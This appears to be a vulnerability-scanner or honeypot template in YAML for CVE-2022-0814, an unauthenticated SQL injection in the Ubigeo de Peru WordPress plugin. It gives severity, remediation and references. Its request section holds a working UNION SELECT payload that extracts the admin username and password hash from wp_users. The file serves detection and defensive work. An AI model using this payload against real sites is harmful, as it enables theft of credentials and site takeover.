id: CVE-2022-0814
info:
  name: Ubigeo de Peru < 3.6.4 - SQL Injection
  author: r3Y3r53
  description: 'The plugin does not properly sanitise and escape some parameters before
    using them in SQL statements via various AJAX actions, some of which are available
    to unauthenticated users, leading to SQL Injections.

    '
  severity: critical
  remediation: Fixed in version 3.6.4
  reference:
  - https://wpscan.com/vulnerability/fd84dc08-0079-4fcf-81c3-a61d652e3269
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0814
  - https://wordpress.org/plugins/ubigeo-peru/
  - https://github.com/cyllective/CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0814
    cwe-id: CWE-89
    epss-score: 0.03633
    epss-percentile: 0.91467
    cpe: cpe:2.3:a:ubigeo_de_peru_para_woocommerce_project:ubigeo_de_peru_para_woocommerce:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: ubigeo_de_peru_para_woocommerce_project
    product: ubigeo_de_peru_para_woocommerce
    framework: wordpress
    publicwww-query: /wp-content/plugins/ubigeo-peru/
  tags: cve,cve2022,wordpress,wpscan,wp-plugin,sqli,ubigeo-peru,unauth,ubigeo_de_peru_para_woocommerce_project
traps:
- request:
    method: POST
    path: /wp-admin/admin-ajax.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'action=rt_ubigeo_load_distritos_address&idProv=1%20UNION%20SELECT%201,(SELECT%20user_login%20FROM%20wp_users%20WHERE%20ID%20=%201),(SELECT%20user_pass%20FROM%20wp_users%20WHERE%20ID%20=%201)%20from%20wp_users#

      '
  response:
    status_code: 200
    headers: {}
    body: idProvidDistdistrito
